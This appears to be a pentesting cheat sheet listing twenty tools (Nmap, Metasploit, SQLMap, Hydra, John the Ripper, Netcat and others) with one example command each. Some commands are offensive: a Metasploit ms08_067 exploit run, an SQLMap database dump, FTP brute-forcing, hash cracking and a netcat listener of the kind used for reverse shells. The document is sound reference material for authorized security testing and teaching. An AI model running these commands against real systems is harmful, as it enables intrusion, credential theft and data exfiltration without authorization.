# Essentials Tools for Pentest

Here are some essential tools and scripts useful for penetration testing:

## 1. Nmap: Network scanning tool to discover hosts and services.
```bash
nmap -sV -O 192.168.1.0/24
```

## 2. Metasploit Framework: Penetration testing tool to exploit vulnerabilities.
```bash
msfconsole
use exploit/windows/smb/ms08_067_netapi
set RHOST 192.168.1.10
exploit
```

## 3. SQLMap: Tool to automate SQL injection attacks.
```bash
sqlmap -u http://example.com/vulnerable.php?id=1 --dump
```

## 4. John the Ripper: Password cracking tool.
```bash
john --wordlist=rockyou.txt hash.txt
```

## 5. Hydra: Brute-force tool for multiple protocols.
```bash
hydra -l admin -P wordlist.txt ftp://192.168.1.10
```

## 6. Wireshark: Network protocol analyzer.
```bash
wireshark -i eth0
```

## 7. Burp Suite: Web application security testing tool.
```bash
java -jar burpsuite.jar
```

## 8. Nikto: Web server scanner.
```bash
nikto -h http://example.com
```

## 9. Dirbuster: Directory brute-forcing tool.
```bash
dirbuster http://example.com
```

## 10. Netcat: Network utility for reading/writing data across networks.
```bash
nc -lvp 4444
```

## 11. Python Scapy: Packet manipulation tool.
```python
from scapy.all import *
packet = IP(dst="192.168.1.10")/ICMP()
send(packet)
```

## 12. Rustscan: Fast port scanner.
```bash
rustscan -a 192.168.1.0/24
```

## 13. Amass: Attack surface mapping tool.
```bash
amass enum -d example.com
```

## 14. Subfinder: Subdomain discovery tool.
```bash
subfinder -d example.com
```

## 15. Nuclei: Template-based vulnerability scanner.
```bash
nuclei -u http://example.com -t nuclei-templates/
```

## 16. Gobuster: Directory/file brute-forcing tool.
```bash
gobuster dir -u http://example.com -w wordlist.txt
```

## 17. ffuf: Fuzzing tool for web applications.
```bash
ffuf -u http://example.com/FUZZ -w wordlist.txt
```

## 18. Impacket: Network protocols implementation in Python.
```python
from impacket.smbconnection import SMBConnection
conn = SMBConnection('192.168.1.10', '192.168.1.10')
conn.login('admin', 'password')
```

## 19. Masscan: Fast port scanner.
```bash
masscan -p 80,443 192.168.1.0/24
```

## 20. EyeWitness: Website screenshot and information gathering tool.
```bash
eyewitness -f urls.txt --web
```

## ⚠️ DISCLAIMER

**Remember to always perform these tests on isolated networks and systems to avoid any unintended consequences.**